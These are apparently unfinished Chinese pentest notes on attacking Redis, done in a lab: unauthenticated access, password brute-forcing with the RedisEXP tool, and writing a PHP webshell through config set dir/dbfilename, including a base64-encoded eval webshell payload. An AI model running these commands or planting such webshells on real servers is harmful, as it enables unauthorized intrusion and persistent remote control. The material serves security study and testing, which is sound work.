## redis简介

* Redis的数据存储在内存中，读写速度极快，常用作缓存服务
* Redis支持多种数据类型，包括：
  - 字符串（String）
  - 列表（List）
  - 集合（Set）
  - 有序集合（Sorted Set）
  - 哈希（Hash）
  - 位图（Bitmap）
  - HyperLogLog
  - Streams
* Redis也支持数据持久化，可以将内存中的数据定期快照（RDB）或以追加方式记录（AOF），确保数据在系统崩溃后能够恢复
* 通过主从复制（Master-Slave Replication）和哨兵（Sentinel）模式，Redis可以实现高可用性，自动故障转移。主从复制也可被攻击者用于提权。
* Redis支持简单的事务机制，可以通过`MULTI`、`EXEC`和`DISCARD`命令实现多个操作的原子性
* Redis支持在服务器端执行Lua脚本，能够批量执行多个命令，提高效率

## 如何打入redis

### redis未授权访问

* Redis2.x和3.x版本在**默认情况下没有启用访问控制**，这意味着如果Redis实例没有经过适当配置，任何人都可以通过网络连接访问Redis，并执行redis的命令
* 在高版本下，redis**默认情况下没有启用访问控制**，但是默认开启protected-mode：
  * 默认只能本地访问
  * 如果开启远程访问，必须设置密码


在实战过程中很容易判断redis是否启用访问控制，所以这里不再复现

### redis爆破

如果redis开启了访问控制，最直接获取其权限的方式就是爆破，这里推荐使用工具[yuyan-sec/RedisEXP: Redis 漏洞利用工具 (github.com)](https://github.com/yuyan-sec/RedisEXP)，这是一个redis的综合利用工具，除了这里的爆破，后面还会用到它

```shell
# 爆破redis
RedisEXP_windows_amd64.exe -m brute -r 192.168.110.179 -p 6379 -f pass.txt
```

* redis原生是没有用户名 - 密码认证模式的，默认情况下只有密码没有用户名

### ssrf打redis

### redis注入命令

## 拿到redis权限后如何进一步提权

### 写webshell

* 条件：
  * 知道网站绝对路径
  * 可以任意写文件
    * 需要该目录下的增删改查权限（这个一般需要redis以root权限运行或者于web服务器以相同的用户权限运行，还要防止selinux等一些权限控制系统，我在实验时通过apt包管理安装的redis默认运行在自动创建的用户redis下）
    * 在6.x版本及以后，需将配置文件中的enable-protected-configs设置为yes，这个配置默认为no限制了我们使用config set dir

这里搭建了一个简单的php站点，路径在`/www/wwwroot/192.168.110.177`下

```shell
# 设置要写入shell的路径
config set dir /www/wwwroot/192.168.110.177
# 对一个key写入webshell
set webshell "\n\n\n<?php phpinfo() ;?>\n\n\n"
# 持久化文件的文件名
config set dbfilename phpinfo.php
# 保存key
save
```

这里一般写入长度较短的小马没啥问题，要是写入的webshell长度过长，可能会遇到一些问题：

[原创 Paper | Windows 与 Java 环境下的 Redis 利用分析 (qq.com)](https://mp.weixin.qq.com/s/f7hPOoSSiRJpyMK51_Vxrw)

* 工具

```shell
RedisEXP_windows_amd64.exe -m shell -r 192.168.110.177 -p 6379 -w foobared -rp /www/wwwroot/192.168.110.177 -rf shell.php -s IlxuXG5cbjw/cGhwIGVjaG8gZXZhbCgkX0dFVFsnc2hlbGwnXSk7Pz5cblxuXG4i -b
```



### 写ssh-keygen公钥

### 写计划任务

### redis主从复制getshell

#### 远程主从

#### 本地主从

### CVE-2022-0543

## 实战案例

### redis到shiro反序列化

